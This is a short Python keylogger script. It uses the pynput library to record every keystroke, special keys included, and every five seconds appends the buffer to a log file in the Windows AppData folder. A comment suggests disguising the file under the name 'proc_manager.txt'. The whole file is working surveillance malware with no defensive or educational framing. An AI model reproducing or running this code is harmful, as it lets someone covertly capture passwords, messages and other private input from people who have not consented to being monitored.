import pynput.keyboard
import threading
import os

keys = ''
path = os.environ['appdata'] + '\\logger.txt' # could be: proc_manager.txt

def process_keys(key):
    global keys
    try:
        keys += key.char  # Normal character keys
    except AttributeError:
        if key == key.space:
            keys += ' '
        elif key == key.enter:
            keys += '\n'
        else:
            keys += f' [{key}] '  # Log special keys

def print_info():
    global keys
    global path
    f_in = open(path, 'a')
    f_in.write(keys)
    keys = ''
    f_in.close()
    timer = threading.Timer(5, print_info)
    timer.start()

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        print_info()
        keyboard_listener.join()